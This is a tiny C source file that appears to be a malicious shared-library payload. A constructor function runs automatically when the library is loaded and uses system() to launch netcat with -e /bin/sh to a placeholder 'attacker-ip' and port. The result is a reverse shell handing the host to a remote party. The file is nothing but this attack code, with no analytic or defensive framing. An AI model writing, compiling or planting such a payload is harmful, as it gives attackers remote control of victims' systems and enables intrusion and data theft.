#include <stdlib.h>
__attribute__((constructor)) void init() {
   system("sh -c 'nc attacker-ip attacker-port -e /bin/sh'"); 
}